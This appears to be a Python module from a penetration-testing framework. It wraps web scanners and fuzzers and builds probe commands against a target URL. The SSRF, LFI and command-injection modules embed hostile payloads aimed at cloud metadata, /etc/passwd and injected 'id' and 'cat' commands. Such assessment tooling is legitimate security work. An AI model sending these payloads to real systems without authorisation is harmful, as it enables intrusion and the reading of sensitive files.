"""
Web application testing modules — comprehensive web vuln assessment.

Covers: directory brute-forcing, XSS, CSRF, SSRF, file inclusion,
command injection, CORS, clickjacking, CMS scanning, WAF detection,
parameter fuzzing, and more.
"""

from __future__ import annotations

from typing import Any, TYPE_CHECKING

from relic.modules.base import BaseModule, ModuleResult

if TYPE_CHECKING:
    from relic.core.engine import Engine


# ═══════════════════════════════════════════════════════════════════
# Directory / File Discovery
# ═══════════════════════════════════════════════════════════════════

class GobusterModule(BaseModule):
    """Directory and file brute-forcing with Gobuster."""

    name = "gobuster"
    description = "Directory/file brute-force using Gobuster"
    category = "web"

    def get_commands(self, url: str = "", wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                     extensions: str = "php,html,txt,js,json,xml,bak,old", **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"gobuster dir -u {url} -w {wordlist} -x {extensions} -t 50 -q --no-error",
             "description": f"Brute-force directories/files on {url}"},
            {"command": f"gobuster dir -u {url} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -q --no-error",
             "description": f"Extended directory brute-force with larger wordlist on {url}"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        combined = "\n".join(outputs)
        findings = [{"type": "directory", "path": line.strip(), "severity": "info"}
                    for line in combined.splitlines() if line.strip().startswith("/")]
        return ModuleResult(module=self.name, output=combined, findings=findings)


class FfufModule(BaseModule):
    """Fast web fuzzer — FFUF."""

    name = "ffuf"
    description = "Fast web fuzzer for directories, parameters, and virtual hosts"
    category = "web"

    def get_commands(self, url: str = "", wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                     **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"ffuf -u {url}/FUZZ -w {wordlist} -mc 200,204,301,302,307,403 -t 50 -o /tmp/relic_ffuf.json -of json",
             "description": f"Fuzz directories on {url}"},
            {"command": f"ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,204,301,302 -t 50",
             "description": f"Fuzz files with raft-large wordlist on {url}"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        return ModuleResult(module=self.name, output="\n".join(outputs))


class DirSearchModule(BaseModule):
    """DirSearch — advanced directory brute-forcer."""

    name = "dirsearch"
    description = "Advanced web directory brute-force with dirsearch"
    category = "web"

    def get_commands(self, url: str = "", **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"dirsearch -u {url} -e php,html,js,txt,json,xml,bak -t 50 --format json -o /tmp/relic_dirsearch.json",
             "description": f"DirSearch scan on {url}"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        output = await engine.run_single_command(self.get_commands(url=url)[0]["command"])
        return ModuleResult(module=self.name, output=output)


class WfuzzModule(BaseModule):
    """Wfuzz — web application fuzzer."""

    name = "wfuzz"
    description = "Parameter and path fuzzing with Wfuzz"
    category = "web"

    def get_commands(self, url: str = "", wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                     **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"wfuzz -c -z file,{wordlist} --hc 404 {url}/FUZZ",
             "description": f"Wfuzz directory fuzzing on {url}"},
            {"command": f"wfuzz -c -z file,{wordlist} --hc 404 \"{url}?FUZZ=test\"",
             "description": f"Wfuzz parameter discovery on {url}"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        return ModuleResult(module=self.name, output="\n".join(outputs))


# ═══════════════════════════════════════════════════════════════════
# Vulnerability Scanners
# ═══════════════════════════════════════════════════════════════════

class NiktoModule(BaseModule):
    """Nikto — comprehensive web server scanner."""

    name = "nikto"
    description = "Web server vulnerability scanner"
    category = "web"

    def get_commands(self, url: str = "", **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"nikto -h {url} -output /tmp/relic_nikto.txt -Format txt",
             "description": f"Full Nikto scan on {url}"},
            {"command": "cat /tmp/relic_nikto.txt",
             "description": "Read Nikto results"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        combined = "\n".join(outputs)
        findings = []
        for line in combined.splitlines():
            if "+ " in line and "OSVDB" in line:
                findings.append({"type": "web_vuln", "title": line.strip(), "severity": "medium"})
        return ModuleResult(module=self.name, output=combined, findings=findings)


class NucleiModule(BaseModule):
    """Nuclei — fast template-based vulnerability scanner."""

    name = "nuclei"
    description = "Template-based vulnerability scanning with Nuclei"
    category = "web"

    def get_commands(self, url: str = "", severity: str = "critical,high,medium",
                     **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"nuclei -u {url} -severity {severity} -o /tmp/relic_nuclei.txt",
             "description": f"Nuclei vulnerability scan ({severity}) on {url}"},
            {"command": f"nuclei -u {url} -t cves/ -severity critical,high -o /tmp/relic_nuclei_cves.txt",
             "description": f"Nuclei CVE-specific scan on {url}"},
            {"command": f"nuclei -u {url} -t exposures/ -o /tmp/relic_nuclei_exposures.txt",
             "description": f"Nuclei exposure/leak detection on {url}"},
            {"command": "cat /tmp/relic_nuclei.txt /tmp/relic_nuclei_cves.txt /tmp/relic_nuclei_exposures.txt 2>/dev/null",
             "description": "Read all Nuclei results"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        combined = "\n".join(outputs)
        findings = []
        for line in combined.splitlines():
            if "[critical]" in line.lower():
                findings.append({"type": "nuclei", "title": line.strip(), "severity": "critical"})
            elif "[high]" in line.lower():
                findings.append({"type": "nuclei", "title": line.strip(), "severity": "high"})
            elif "[medium]" in line.lower():
                findings.append({"type": "nuclei", "title": line.strip(), "severity": "medium"})
        return ModuleResult(module=self.name, output=combined, findings=findings)


class WappalyzerModule(BaseModule):
    """Technology fingerprinting with Wappalyzer/WhatWeb."""

    name = "wappalyzer"
    description = "Identify web technologies, frameworks, and servers"
    category = "web"

    def get_commands(self, url: str = "", **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"whatweb -a 3 -v {url}",
             "description": f"WhatWeb technology fingerprinting on {url}"},
            {"command": f"wad -u {url} 2>/dev/null || echo 'wad not installed, using whatweb only'",
             "description": f"WAD fingerprinting on {url}"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        return ModuleResult(module=self.name, output="\n".join(outputs))


class WafDetectModule(BaseModule):
    """WAF detection and fingerprinting."""

    name = "waf-detect"
    description = "Detect and identify Web Application Firewalls"
    category = "web"

    def get_commands(self, url: str = "", **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"wafw00f {url} -a",
             "description": f"WAF fingerprinting on {url}"},
            {"command": f"nmap --script http-waf-detect -p 80,443 {url.replace('http://', '').replace('https://', '').split('/')[0]}",
             "description": f"Nmap WAF detection scripts"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        combined = "\n".join(outputs)
        findings = []
        if "is behind" in combined.lower():
            findings.append({"type": "waf", "title": "WAF Detected", "severity": "info"})
        return ModuleResult(module=self.name, output=combined, findings=findings)


# ═══════════════════════════════════════════════════════════════════
# XSS Testing
# ═══════════════════════════════════════════════════════════════════

class XSSModule(BaseModule):
    """Cross-Site Scripting detection and testing."""

    name = "xss"
    description = "Automated XSS detection using multiple tools"
    category = "web"

    def get_commands(self, url: str = "", **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"dalfox url {url} --silence --output /tmp/relic_xss.txt",
             "description": f"DalFox XSS scanning on {url}"},
            {"command": f"python3 -m xsstrike -u {url} --crawl 2>/dev/null || echo 'XSStrike not available'",
             "description": f"XSStrike scanning on {url}"},
            {"command": "cat /tmp/relic_xss.txt 2>/dev/null",
             "description": "Read XSS scan results"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        combined = "\n".join(outputs)
        findings = []
        if "xss" in combined.lower() or "reflected" in combined.lower() or "stored" in combined.lower():
            findings.append({"type": "xss", "title": "Potential XSS Found", "severity": "high", "url": url})
        return ModuleResult(module=self.name, output=combined, findings=findings)


# ═══════════════════════════════════════════════════════════════════
# SSRF / LFI / RFI / Command Injection
# ═══════════════════════════════════════════════════════════════════

class SSRFModule(BaseModule):
    """Server-Side Request Forgery testing."""

    name = "ssrf"
    description = "SSRF detection and exploitation"
    category = "web"

    def get_commands(self, url: str = "", param: str = "url", **kwargs: Any) -> list[dict[str, str]]:
        payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]",
            "http://0x7f000001",
            "file:///etc/passwd",
        ]
        cmds = []
        for p in payloads:
            cmds.append({
                "command": f"curl -s -o /dev/null -w '%{{http_code}}' '{url}?{param}={p}'",
                "description": f"SSRF test with payload {p}",
            })
        return cmds

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        combined = "\n".join(outputs)
        findings = []
        if "200" in combined:
            findings.append({"type": "ssrf", "title": "Potential SSRF", "severity": "high", "url": url})
        return ModuleResult(module=self.name, output=combined, findings=findings)


class LFIModule(BaseModule):
    """Local File Inclusion testing."""

    name = "lfi"
    description = "Local File Inclusion (LFI) / path traversal testing"
    category = "web"

    def get_commands(self, url: str = "", param: str = "page", **kwargs: Any) -> list[dict[str, str]]:
        traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "/etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
        ]
        cmds = []
        for t in traversals:
            cmds.append({
                "command": f"curl -s '{url}?{param}={t}'",
                "description": f"LFI test: {t[:40]}",
            })
        return cmds

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        combined = "\n".join(outputs)
        findings = []
        if "root:" in combined or "daemon:" in combined:
            findings.append({"type": "lfi", "title": "LFI — /etc/passwd readable", "severity": "critical", "url": url})
        return ModuleResult(module=self.name, output=combined, findings=findings)


class CommandInjectionModule(BaseModule):
    """OS command injection testing."""

    name = "cmdi"
    description = "OS command injection detection"
    category = "web"

    def get_commands(self, url: str = "", param: str = "cmd", **kwargs: Any) -> list[dict[str, str]]:
        payloads = [
            ";id", "|id", "$(id)", "`id`",
            ";cat /etc/passwd", "| cat /etc/passwd",
            ";sleep 5", "|sleep 5", "$(sleep 5)",
        ]
        return [
            {"command": f"curl -s -o /tmp/relic_cmdi.txt -w '%{{http_code}} %{{time_total}}' '{url}?{param}={p}'",
             "description": f"Command injection test: {p}"}
            for p in payloads
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        combined = "\n".join(outputs)
        findings = []
        if "uid=" in combined or "root:" in combined:
            findings.append({"type": "cmdi", "title": "Command Injection Confirmed", "severity": "critical", "url": url})
        return ModuleResult(module=self.name, output=combined, findings=findings)


# ═══════════════════════════════════════════════════════════════════
# CMS Scanners
# ═══════════════════════════════════════════════════════════════════

class WPScanModule(BaseModule):
    """WordPress vulnerability scanning."""

    name = "wpscan"
    description = "WordPress vulnerability scanner"
    category = "web"

    def get_commands(self, url: str = "", **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"wpscan --url {url} --enumerate vp,vt,u,dbe --random-user-agent --output /tmp/relic_wpscan.txt",
             "description": f"Full WordPress scan on {url}"},
            {"command": "cat /tmp/relic_wpscan.txt",
             "description": "Read WPScan results"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        combined = "\n".join(outputs)
        findings = []
        for line in combined.splitlines():
            if "[!]" in line:
                findings.append({"type": "wordpress", "title": line.strip(), "severity": "high"})
        return ModuleResult(module=self.name, output=combined, findings=findings)


class JoomScanModule(BaseModule):
    """Joomla vulnerability scanning."""

    name = "joomscan"
    description = "Joomla CMS vulnerability scanner"
    category = "web"

    def get_commands(self, url: str = "", **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"joomscan -u {url} --ec",
             "description": f"Joomla scan on {url}"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        output = await engine.run_single_command(self.get_commands(url=url)[0]["command"])
        return ModuleResult(module=self.name, output=output)


class DroopeScanModule(BaseModule):
    """Drupal/Silverstripe/WordPress CMS scanner."""

    name = "droopescan"
    description = "Multi-CMS vulnerability scanner (Drupal, WordPress, Silverstripe)"
    category = "web"

    def get_commands(self, url: str = "", **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"droopescan scan -u {url}",
             "description": f"DroopeScan CMS scan on {url}"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        output = await engine.run_single_command(self.get_commands(url=url)[0]["command"])
        return ModuleResult(module=self.name, output=output)


# ═══════════════════════════════════════════════════════════════════
# HTTP Header / Security Config
# ═══════════════════════════════════════════════════════════════════

class SecurityHeadersModule(BaseModule):
    """HTTP security header analysis."""

    name = "security-headers"
    description = "Check HTTP security headers and misconfigurations"
    category = "web"

    def get_commands(self, url: str = "", **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"curl -sI {url}",
             "description": f"Fetch HTTP headers from {url}"},
            {"command": f"curl -sI {url} | grep -iE 'strict-transport|content-security|x-frame|x-content-type|x-xss|referrer-policy|permissions-policy|feature-policy|access-control'",
             "description": "Check for security headers"},
            {"command": f"nmap --script http-security-headers -p 80,443 {url.replace('http://', '').replace('https://', '').split('/')[0]}",
             "description": "Nmap security header scripts"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        combined = "\n".join(outputs)
        findings = []
        missing = []
        headers_lower = combined.lower()
        for hdr in ["strict-transport-security", "content-security-policy", "x-frame-options",
                     "x-content-type-options", "x-xss-protection"]:
            if hdr not in headers_lower:
                missing.append(hdr)
        if missing:
            findings.append({
                "type": "missing_headers",
                "title": f"Missing Security Headers: {', '.join(missing)}",
                "severity": "medium",
            })
        return ModuleResult(module=self.name, output=combined, findings=findings)


class CORSModule(BaseModule):
    """CORS misconfiguration testing."""

    name = "cors"
    description = "Test for CORS misconfigurations"
    category = "web"

    def get_commands(self, url: str = "", **kwargs: Any) -> list[dict[str, str]]:
        origins = ["https://evil.com", "null", "https://attacker.com", url]
        return [
            {"command": f"curl -sI -H 'Origin: {origin}' {url} | grep -i access-control",
             "description": f"CORS test with Origin: {origin}"}
            for origin in origins
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        combined = "\n".join(outputs)
        findings = []
        if "evil.com" in combined or "attacker.com" in combined or "access-control-allow-origin: *" in combined.lower():
            findings.append({"type": "cors", "title": "CORS Misconfiguration", "severity": "high"})
        return ModuleResult(module=self.name, output=combined, findings=findings)


class ClickjackModule(BaseModule):
    """Clickjacking vulnerability testing."""

    name = "clickjack"
    description = "Test for clickjacking via X-Frame-Options / CSP"
    category = "web"

    def get_commands(self, url: str = "", **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"curl -sI {url} | grep -iE 'x-frame-options|content-security-policy'",
             "description": f"Check X-Frame-Options and CSP frame-ancestors on {url}"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        output = await engine.run_single_command(self.get_commands(url=url)[0]["command"])
        findings = []
        if not output.strip():
            findings.append({"type": "clickjacking", "title": "No X-Frame-Options or CSP frame-ancestors", "severity": "medium"})
        return ModuleResult(module=self.name, output=output, findings=findings)


# ═══════════════════════════════════════════════════════════════════
# Web Crawling & Spidering
# ═══════════════════════════════════════════════════════════════════

class SpiderModule(BaseModule):
    """Web crawling/spidering for content discovery."""

    name = "spider"
    description = "Crawl and spider the target web application"
    category = "web"

    def get_commands(self, url: str = "", **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"gospider -s {url} -d 3 -c 10 --other-source -o /tmp/relic_spider/",
             "description": f"GoSpider crawl on {url}"},
            {"command": f"hakrawler -url {url} -depth 3 -plain 2>/dev/null",
             "description": f"Hakrawler crawl on {url}"},
            {"command": f"katana -u {url} -d 3 -jc -o /tmp/relic_katana.txt 2>/dev/null",
             "description": f"Katana crawl on {url}"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        return ModuleResult(module=self.name, output="\n".join(outputs))


class ParamMinerModule(BaseModule):
    """Hidden parameter discovery."""

    name = "param-miner"
    description = "Discover hidden HTTP parameters"
    category = "web"

    def get_commands(self, url: str = "", **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"arjun -u {url} -t 10 -o /tmp/relic_arjun.json",
             "description": f"Arjun parameter discovery on {url}"},
            {"command": f"paramspider -d {url.replace('http://', '').replace('https://', '').split('/')[0]} --output /tmp/relic_paramspider.txt 2>/dev/null",
             "description": f"ParamSpider parameter mining"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        return ModuleResult(module=self.name, output="\n".join(outputs))


class SubdomainTakeoverModule(BaseModule):
    """Subdomain takeover detection."""

    name = "subdomain-takeover"
    description = "Detect subdomain takeover vulnerabilities"
    category = "web"

    def get_commands(self, domain: str = "", **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"subjack -w /tmp/relic_subs.txt -t 20 -o /tmp/relic_subjack.txt -ssl 2>/dev/null",
             "description": f"Subjack takeover check"},
            {"command": f"nuclei -l /tmp/relic_subs.txt -t takeovers/ -o /tmp/relic_takeover.txt 2>/dev/null",
             "description": "Nuclei takeover templates"},
        ]

    async def run(self, engine: "Engine", domain: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(domain=domain, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        combined = "\n".join(outputs)
        findings = []
        if "takeover" in combined.lower():
            findings.append({"type": "takeover", "title": "Subdomain Takeover Possible", "severity": "high"})
        return ModuleResult(module=self.name, output=combined, findings=findings)


# ═══════════════════════════════════════════════════════════════════
# GraphQL / WebSocket
# ═══════════════════════════════════════════════════════════════════

class GraphQLModule(BaseModule):
    """GraphQL endpoint testing."""

    name = "graphql"
    description = "GraphQL introspection and vulnerability testing"
    category = "web"

    def get_commands(self, url: str = "", **kwargs: Any) -> list[dict[str, str]]:
        return [
            {"command": f"curl -s -X POST {url} -H 'Content-Type: application/json' -d '{{\"query\": \"{{__schema{{types{{name}}}}}}\"}}'",
             "description": "GraphQL introspection query"},
            {"command": f"curl -s -X POST {url} -H 'Content-Type: application/json' -d '{{\"query\": \"{{__type(name: \\\"Query\\\"){{name fields{{name type{{name}}}}}}}}\"}}'",
             "description": "GraphQL Query type enumeration"},
            {"command": f"graphqlmap -u {url} --method POST 2>/dev/null",
             "description": "GraphQLmap automated testing"},
        ]

    async def run(self, engine: "Engine", url: str = "", **kwargs: Any) -> ModuleResult:
        commands = self.get_commands(url=url, **kwargs)
        outputs = [await engine.run_single_command(c["command"]) for c in commands]
        combined = "\n".join(outputs)
        findings = []
        if "__schema" in combined or "__type" in combined:
            findings.append({"type": "graphql_introspection", "title": "GraphQL Introspection Enabled", "severity": "medium"})
        return ModuleResult(module=self.name, output=combined, findings=findings)


# ═══════════════════════════════════════════════════════════════════
# Registry
# ═══════════════════════════════════════════════════════════════════

WEB_MODULES: dict[str, type[BaseModule]] = {
    "gobuster": GobusterModule,
    "ffuf": FfufModule,
    "dirsearch": DirSearchModule,
    "wfuzz": WfuzzModule,
    "nikto": NiktoModule,
    "nuclei": NucleiModule,
    "wappalyzer": WappalyzerModule,
    "waf-detect": WafDetectModule,
    "xss": XSSModule,
    "ssrf": SSRFModule,
    "lfi": LFIModule,
    "cmdi": CommandInjectionModule,
    "wpscan": WPScanModule,
    "joomscan": JoomScanModule,
    "droopescan": DroopeScanModule,
    "security-headers": SecurityHeadersModule,
    "cors": CORSModule,
    "clickjack": ClickjackModule,
    "spider": SpiderModule,
    "param-miner": ParamMinerModule,
    "subdomain-takeover": SubdomainTakeoverModule,
    "graphql": GraphQLModule,
}
